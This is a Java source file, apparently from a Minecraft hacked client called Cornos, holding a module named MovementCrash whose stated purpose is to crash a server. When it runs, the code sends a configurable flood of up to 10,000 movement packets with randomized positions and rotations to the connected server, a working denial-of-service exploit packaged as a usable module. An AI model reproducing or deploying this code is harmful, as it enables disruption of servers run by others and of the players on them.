/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# Project: Cornos
# File: MovementCrash
# Created by constantin at 14:16, MÃ¤r 13 2021
PLEASE READ THE COPYRIGHT NOTICE IN THE PROJECT ROOT, IF EXISTENT
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
*/
package me.constantindev.ccl.module.EXPLOIT.CRASH;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.etc.base.Module;
import me.constantindev.ccl.etc.config.MConfNum;
import me.constantindev.ccl.etc.helper.Rnd;
import me.constantindev.ccl.etc.helper.STL;
import me.constantindev.ccl.etc.ms.ModuleType;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

public class MovementCrash extends Module {
    MConfNum amount;

    public MovementCrash() {
        super("MovementCrash", "Crashes a server using movement packets", ModuleType.CRASH);
        this.amount = (MConfNum) this.mconf.add(new MConfNum("amount", 2000, 10000, 1));
    }

    @Override
    public void onExecute() {
        if (Cornos.minecraft.getNetworkHandler() == null) return;
        try {
            assert Cornos.minecraft.player != null;
            Vec3d currP = Cornos.minecraft.player.getPos();
            for (int i = 0; i < amount.getValue(); i++) {
                PlayerMoveC2SPacket.Both p = new PlayerMoveC2SPacket.Both(currP.x + getDistributedRandom(1),
                        currP.y + getDistributedRandom(1), currP.z + getDistributedRandom(1),
                        (float) Rnd.rndD(90), (float) Rnd.rndD(180), true);
                Cornos.minecraft.getNetworkHandler().sendPacket(p);
            }
        } catch (Exception ignored) {
            STL.notifyUser("Stopped the movement crash because an error occured");
            this.setEnabled(false);
        }
        super.onExecute();
    }

    private double getDistributedRandom(double rad) {
        return (Rnd.rndD(rad) - (rad / 2));
    }
}
